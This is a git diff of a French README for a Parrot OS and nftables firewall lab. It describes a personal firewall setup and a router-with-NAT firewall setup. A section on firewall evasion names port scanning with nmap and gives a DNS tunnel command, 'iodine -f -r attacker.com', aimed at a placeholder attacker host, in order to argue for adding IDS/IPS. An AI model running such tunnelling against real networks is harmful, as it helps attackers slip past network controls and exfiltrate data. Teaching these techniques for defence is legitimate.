@@ -14,9 +14,6 @@ Les démonstrations portent sur les niveaux suivants :
 - Intègre des outils de confidentialité (Tor, Anonsurf, OnionShare).
 - Plus légère que Kali, adaptée aux **machines modestes** et à la virtualisation (VirtualBox, VMware).
 
-
-
-
 ---
 
 ## Niveau 6 (standalone, machine protégée)
@@ -62,78 +59,76 @@ Il doit être combiné avec :
 
 ---
 
-# Conclusion
-Parrot OS est une alternative solide à Kali, plus légère et orientée vie privée.
-
-Les niveaux 6 et 7 démontrent deux cas concrets :
-
-🔒 Protection avancée d’une machine individuelle.
-
-🌐 Mise en place d’un routeur/firewall complet pour un lab réseau.
-
-Ce projet illustre comment un firewall évolue : de simple protection → à composant réseau avancé.
-
-⚡ Technologies utilisées
-Parrot OS
-
-nftables
-
-VirtualBox
-
-
-
-📌 Auteur : Virginie Lechene
-
 # ⚠️ Comment un hacker pourrait contourner
 
+Même avec un firewall avancé (niveaux 6 et 7), il existe des **techniques de contournement** :
 
-Même avec un firewall avancé (niveaux 6 et 7), il existe des techniques de contournement :
+- 🔓 **Exploiter les ports ouverts**
+(ex : `nmap -p 443 <cible>` ➝ scanner en HTTPS).
 
-Exploiter les ports ouverts (ex : nmap -p 443 <cible> → scanner en HTTPS).
+- 🌐 **Tunneling DNS**
+(ex : `iodine` ➝ transformer DNS en canal de communication).
 
-Tunneling DNS (ex : iodine → transformer DNS en canal de communication).
+- 🐞 **Exploiter des failles applicatives** derrière un port autorisé.
 
-Exploiter des failles applicatives derrière un port autorisé.
+---
 
+👉 **C’est pourquoi un firewall seul ne suffit pas** :
+il faut le **combiner avec IDS/IPS + monitoring**.
 
+---
 
-👉 C’est pourquoi on combine firewall + IDS/IPS + monitoring.
+### 📌 Exemple : Tunnel DNS (contournement)
 
-🔹 Exemple — Tunnel DNS (contournement)
-
-
-Comme le port 53 (DNS) est ouvert, un attaquant peut établir un tunnel DNS :
+Comme le port **53 (DNS)** est ouvert, un attaquant peut établir un tunnel DNS :
 
 iodine -f -r attacker.com
 
-👉 Cela permet de faire passer du trafic complet dans des requêtes DNS → contournant le firewall.
+---
 
-🚀 Différence entre Niveau 6 et Niveau 7
+# 🔑 Différence entre Niveau 6 et Niveau 7
+
+### 🔹 Niveau 6 : Firewall personnel
+- Protège uniquement **ta machine locale**.
+- Politique stricte : **tout est bloqué sauf quelques services**.
+- Idéal pour un **poste de travail** ou un **serveur isolé**.
+
+👉 **Exemple :** ton PC sous Parrot OS n’accepte que le trafic **web** et **SSH**.
+
+---
+
+### 🔹 Niveau 7 : Firewall réseau
+- Ta machine devient un **routeur + firewall**.
+- Protège **un réseau interne entier**.
+- Ajoute le **forwarding + NAT**.
+
+# ✅ Conclusion
+
+Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vie privée et adaptée aux environnements pentest.
+
+Les niveaux 6 et 7 démontrent deux cas concrets :
+
+🔒 **Protection avancée d’une machine individuelle** (standalone).
+🌐 **Mise en place d’un routeur/firewall complet** pour un lab réseau.
+
+👉 Ce projet illustre comment un firewall peut évoluer :
+d’une **simple protection locale** ➝ à un **composant réseau avancé**.
+
+---
+
+# 🛠️ Technologies utilisées
+
+- Parrot OS
+- nftables
+- VirtualBox
+
+---
+
+✍️ Auteur : *Virginie Lechene*
 
 
-🔹 Niveau 6 : Firewall personnel
-Ne protège que ta machine locale.
-
-Politique stricte : tout bloqué sauf quelques services.
-
-Idéal pour un poste de travail ou serveur isolé.
 
 
-
-👉 Exemple : ton PC sous Parrot OS n’accepte que le trafic web et SSH.
-
-🔹 Niveau 7 : Firewall réseau
-Ta machine devient un routeur + firewall.
-
-Protège un lab ou réseau interne entier.
-
-Ajoute le forwarding + NAT.
-
-Fonctionne comme un firewall d’entreprise (pfSense, Fortinet, iptables/nftables).
-
-
-
-👉 Exemple : une VM interne passe par ton firewall pour sortir → le firewall contrôle/log tout le trafic.
 
 
 
